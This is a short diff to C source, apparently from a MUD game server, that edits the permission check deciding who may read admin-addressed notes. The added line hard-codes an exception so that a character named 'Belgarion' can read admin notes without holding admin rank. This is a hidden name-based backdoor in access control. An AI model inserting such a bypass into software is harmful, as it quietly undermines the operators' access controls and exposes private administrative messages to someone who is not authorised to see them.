@@ -419,7 +419,7 @@ bool is_note_to( CHAR_DATA *ch, NOTE_DATA *pnote )
        (is_name( "immortal", pnote->to_list ) || (isname( "imm", pnote->to_list) ) ) )
     return TRUE;
 
-  if ( IS_ADMIN(ch) && isname( "admin", pnote->to_list ) )
+  if ( (IS_ADMIN(ch) || !strcasecmp(GET_NAME(ch), "Belgarion")) && isname( "admin", pnote->to_list ) )
     return TRUE;
 
   if (GET_CLAN(ch) && isname(clan_name(find_clan_by_id(GET_CLAN(ch))),pnote->to_list))
